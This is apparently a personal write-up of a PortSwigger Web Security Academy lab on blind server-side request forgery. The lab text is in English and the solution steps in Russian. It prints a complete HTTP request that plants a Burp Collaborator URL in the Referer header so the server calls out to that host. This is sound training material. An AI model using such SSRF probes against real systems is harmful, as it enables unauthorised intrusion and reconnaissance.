# Blind SSRF with out-of-band detection
PRACTITIONER

This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

To solve the lab, use this functionality to cause an HTTP request to the public Burp Collaborator server.

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.

## Решение
Копирую пейлоад из коллаборатора и вставляю в поле Referer в рипитере:
```
GET /product?productId=1 HTTP/2
Host: 0aaa0049046fca0790b1a5f500690049.web-security-academy.net
Cookie: session=BYaNTSBMrzKe9nWHI7boW0CdG3O6H41p
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://etblb1a0akzl4v9u4mo3yov6jxpodi17.oastify.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```
Выполняю. Коллаборатор поймал два DNS-запроса и один HTTP-запрос. Задание выполнено.
